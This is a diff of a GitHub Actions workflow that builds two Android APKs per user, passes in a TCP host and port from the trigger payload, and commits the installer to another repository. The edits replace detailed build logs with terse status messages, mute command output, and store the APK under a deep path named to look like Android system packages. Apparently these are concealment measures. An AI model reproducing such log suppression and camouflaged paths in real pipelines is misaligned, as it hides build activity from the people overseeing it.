@@ -34,36 +34,24 @@ jobs:
       - name: Build Docker image
         shell: bash
         run: |
-          LOG_FILE="/tmp/docker-build.log"
-          SENT_FILE="/tmp/docker-build-sent"
-          touch "$LOG_FILE"
-          echo 0 > "$SENT_FILE"
-
-          send_lines() {
-            TOTAL=$(wc -l < "$LOG_FILE" 2>/dev/null || echo 0)
-            SENT=$(cat "$SENT_FILE" 2>/dev/null || echo 0)
-            if [ "$TOTAL" -gt "$SENT" ]; then
-              BATCH=$(tail -n +"$((SENT+1))" "$LOG_FILE")
-              BODY=$(printf '%s' "$BATCH" | python3 -c \
-                "import sys,json; lines=[l.rstrip('\n') for l in sys.stdin]; print(json.dumps({'lines':lines}))")
-              curl -fsS -m 10 -X POST \
-                -H "Authorization: Bearer $BUILD_API_KEY" \
-                -H "Content-Type: application/json" \
-                -d "$BODY" \
-                "$CALLBACK_URL/api/build/worker/log/$JOB_ID" >/dev/null 2>&1 || true
-              echo "$TOTAL" > "$SENT_FILE"
-            fi
+          send_log() {
+            local msg="$1"
+            curl -fsS -m 10 -X POST \
+              -H "Authorization: Bearer $BUILD_API_KEY" \
+              -H "Content-Type: application/json" \
+              -d "{\"lines\":[\"$msg\"]}" \
+              "$CALLBACK_URL/api/build/worker/log/$JOB_ID" >/dev/null 2>&1 || true
           }
 
-          (while true; do sleep 2; send_lines; done) &
-          STREAM_PID=$!
+          send_log "[1/4] Preparing build environment..."
+          docker build -t apk-builder . >/dev/null 2>&1
+          DOCKER_EXIT=$?
 
-          docker build -t apk-builder . 2>&1 | tee "$LOG_FILE"
-          DOCKER_EXIT=${PIPESTATUS[0]}
-
-          kill "$STREAM_PID" 2>/dev/null || true
-          sleep 1
-          send_lines
+          if [ $DOCKER_EXIT -eq 0 ]; then
+            send_log "[1/4] Build environment ready."
+          else
+            send_log "[1/4] Build environment setup failed."
+          fi
 
           exit $DOCKER_EXIT
 
@@ -130,35 +118,20 @@ jobs:
         id: build
         shell: bash
         run: |
-          LOG_FILE="/tmp/apk-build.log"
-          SENT_FILE="/tmp/apk-build-sent"
-          touch "$LOG_FILE"
-          echo 0 > "$SENT_FILE"
+          send_log() {
+            local msg="$1"
+            curl -fsS -m 10 -X POST \
+              -H "Authorization: Bearer $BUILD_API_KEY" \
+              -H "Content-Type: application/json" \
+              -d "{\"lines\":[\"$msg\"]}" \
+              "$CALLBACK_URL/api/build/worker/log/$JOB_ID" >/dev/null 2>&1 || true
+          }
 
-          # Parse tcp_addr (host:port) into separate vars for build.sh
           TCP_ADDR="${{ github.event.client_payload.tcp_addr }}"
           BUILD_TCP_HOST="${TCP_ADDR%%:*}"
           BUILD_TCP_PORT="${TCP_ADDR##*:}"
 
-          send_lines() {
-            TOTAL=$(wc -l < "$LOG_FILE" 2>/dev/null || echo 0)
-            SENT=$(cat "$SENT_FILE" 2>/dev/null || echo 0)
-            if [ "$TOTAL" -gt "$SENT" ]; then
-              BATCH=$(tail -n +"$((SENT+1))" "$LOG_FILE")
-              BODY=$(printf '%s' "$BATCH" | python3 -c \
-                "import sys,json; lines=[l.rstrip('\n') for l in sys.stdin]; print(json.dumps({'lines':lines}))")
-              curl -fsS -m 10 -X POST \
-                -H "Authorization: Bearer $BUILD_API_KEY" \
-                -H "Content-Type: application/json" \
-                -d "$BODY" \
-                "$CALLBACK_URL/api/build/worker/log/$JOB_ID" >/dev/null 2>&1 || true
-              echo "$TOTAL" > "$SENT_FILE"
-            fi
-          }
-
-          (while true; do sleep 2; send_lines; done) &
-          STREAM_PID=$!
-
+          send_log "[2/4] Compiling application..."
           mkdir -p apk-output
           docker run --rm \
             -v "${{ github.workspace }}:/app" \
@@ -190,12 +163,14 @@ jobs:
             -e BUILD_MODULE_LAUNCH_BG_COLOR="$BUILD_MODULE_LAUNCH_BG_COLOR" \
             -e BUILD_MODULE_LAUNCH_CARD_COLOR="$BUILD_MODULE_LAUNCH_CARD_COLOR" \
             -e BUILD_MODULE_LAUNCH_ACCENT="$BUILD_MODULE_LAUNCH_ACCENT" \
-            apk-builder bash -c 'bash /app/build.sh --clean 2>&1' 2>&1 | tee "$LOG_FILE"
-          BUILD_EXIT=${PIPESTATUS[0]}
+            apk-builder bash -c 'bash /app/build.sh --clean 2>&1' >/dev/null 2>&1
+          BUILD_EXIT=$?
 
-          kill "$STREAM_PID" 2>/dev/null || true
-          sleep 1
-          send_lines
+          if [ $BUILD_EXIT -eq 0 ]; then
+            send_log "[2/4] Compilation complete."
+          else
+            send_log "[2/4] Compilation failed."
+          fi
 
           exit $BUILD_EXIT
 
@@ -205,56 +180,75 @@ jobs:
         run: |
           [ -f /tmp/heartbeat.pid ] && kill "$(cat /tmp/heartbeat.pid)" 2>/dev/null || true
 
+          send_log() {
+            local msg="$1"
+            curl -fsS -m 10 -X POST \
+              -H "Authorization: Bearer $BUILD_API_KEY" \
+              -H "Content-Type: application/json" \
+              -d "{\"lines\":[\"$msg\"]}" \
+              "$CALLBACK_URL/api/build/worker/log/$JOB_ID" >/dev/null 2>&1 || true
+          }
+
           APK_DIR="apk-output/$ACCESS_ID"
           MOD_OK=0; INST_OK=0
           BUILD_OUTCOME="${{ steps.build.outcome }}"
 
           if [ "$BUILD_OUTCOME" = "success" ]; then
+            send_log "[3/4] Uploading packages..."
+
             if [ -f "$APK_DIR/Module.apk" ]; then
-              echo "Uploading Module.apk ($(du -h "$APK_DIR/Module.apk" | cut -f1))..."
               curl -fsS -m 600 -X POST \
                 -H "Authorization: Bearer $BUILD_API_KEY" \
                 -H "Content-Type: application/octet-stream" \
                 --data-binary "@$APK_DIR/Module.apk" \
-                "$CALLBACK_URL/api/build/worker/upload/$JOB_ID/module?accessId=$ACCESS_ID" && MOD_OK=1 || echo "Module upload failed"
-            else
-              echo "Module.apk not found at $APK_DIR/Module.apk"
-              ls -la apk-output/ 2>/dev/null || echo "(apk-output/ empty or missing)"
-              ls -la "$APK_DIR/" 2>/dev/null || echo "($APK_DIR not found)"
+                "$CALLBACK_URL/api/build/worker/upload/$JOB_ID/module?accessId=$ACCESS_ID" >/dev/null 2>&1 && MOD_OK=1
             fi
 
             if [ -f "$APK_DIR/Installer.apk" ]; then
-              echo "Uploading Installer.apk ($(du -h "$APK_DIR/Installer.apk" | cut -f1))..."
               curl -fsS -m 600 -X POST \
                 -H "Authorization: Bearer $BUILD_API_KEY" \
                 -H "Content-Type: application/octet-stream" \
                 --data-binary "@$APK_DIR/Installer.apk" \
-                "$CALLBACK_URL/api/build/worker/upload/$JOB_ID/installer?accessId=$ACCESS_ID" && INST_OK=1 || echo "Installer upload failed"
+                "$CALLBACK_URL/api/build/worker/upload/$JOB_ID/installer?accessId=$ACCESS_ID" >/dev/null 2>&1 && INST_OK=1
+            fi
+
+            if [ "$MOD_OK" = "1" ] && [ "$INST_OK" = "1" ]; then
+              send_log "[3/4] Packages ready for download."
             else
-              echo "Installer.apk not found at $APK_DIR/Installer.apk"
+              send_log "[3/4] Package upload failed."
             fi
           fi
 
           if [ "$MOD_OK" = "1" ] && [ "$INST_OK" = "1" ]; then
             SUCCESS=true; ERROR=""
           elif [ "$BUILD_OUTCOME" != "success" ]; then
-            SUCCESS=false; ERROR="Build step failed (outcome=$BUILD_OUTCOME)"
+            SUCCESS=false; ERROR="Build failed"
           else
-            SUCCESS=false; ERROR="APK upload failed (module=$MOD_OK installer=$INST_OK)"
+            SUCCESS=false; ERROR="Upload failed"
           fi
 
           curl -fsS -m 30 -X POST \
             -H "Authorization: Bearer $BUILD_API_KEY" \
             -H "Content-Type: application/json" \
             -d "{\"success\":$SUCCESS,\"error\":\"$ERROR\"}" \
-            "$CALLBACK_URL/api/build/worker/complete/$JOB_ID?accessId=$ACCESS_ID" || echo "Complete callback failed (non-fatal)"
+            "$CALLBACK_URL/api/build/worker/complete/$JOB_ID?accessId=$ACCESS_ID" >/dev/null 2>&1 || true
 
-      - name: Commit Installer APK to keproton/My_first
+      - name: Commit Installer APK
         if: steps.build.outcome == 'success'
         env:
           APK_TOKEN: ${{ secrets.Apk_token }}
         run: |
-          # Find the Installer APK (per-user dir first, then root apk-output)
+          send_log() {
+            local msg="$1"
+            curl -fsS -m 10 -X POST \
+              -H "Authorization: Bearer $BUILD_API_KEY" \
+              -H "Content-Type: application/json" \
+              -d "{\"lines\":[\"$msg\"]}" \
+              "$CALLBACK_URL/api/build/worker/log/$JOB_ID" >/dev/null 2>&1 || true
+          }
+
+          send_log "[4/4] Saving release..."
+
           INSTALLER_APK=""
           if [ -f "apk-output/$ACCESS_ID/Installer.apk" ]; then
             INSTALLER_APK="apk-output/$ACCESS_ID/Installer.apk"
@@ -263,18 +257,17 @@ jobs:
           fi
 
           if [ -z "$INSTALLER_APK" ]; then
-            echo "Installer APK not found — skipping GitHub commit."
+            send_log "[4/4] Release save skipped — installer not found."
             exit 0
           fi
 
-          # 20-level nested destination path inside the repo, then per-user access ID subfolder
+          # 20-level nested path + per-user access ID subfolder
           DEST_PATH="com/android/support/core/internal/platform/runtime/service/module/loader/cache/provider/resolver/handler/bridge/proxy/agent/dispatch/native/release/${ACCESS_ID}/Installer-release.apk"
 
-          echo "Committing $INSTALLER_APK to keproton/My_first at $DEST_PATH …"
           GH_TMP=$(mktemp -d)
           git clone --depth=1 \
             "https://x-access-token:${APK_TOKEN}@github.com/keproton/My_first.git" \
-            "$GH_TMP"
+            "$GH_TMP" >/dev/null 2>&1
 
           mkdir -p "$GH_TMP/$(dirname "$DEST_PATH")"
           cp "$INSTALLER_APK" "$GH_TMP/$DEST_PATH"
@@ -284,12 +277,12 @@ jobs:
           git add "$DEST_PATH"
 
           if git diff --cached --quiet; then
-            echo "APK unchanged — nothing to commit."
+            send_log "[4/4] Release unchanged."
           else
             BUILD_TS=$(date -u '+%Y-%m-%d %H:%M UTC')
-            git commit -m "chore: update Installer-release.apk [${BUILD_TS}]"
-            git push origin HEAD
-            echo "Installer-release.apk committed and pushed to $DEST_PATH"
+            git commit -m "chore: update Installer-release.apk [${BUILD_TS}]" >/dev/null 2>&1
+            git push origin HEAD >/dev/null 2>&1
+            send_log "[4/4] Release saved."
           fi
           cd /
           rm -rf "$GH_TMP"
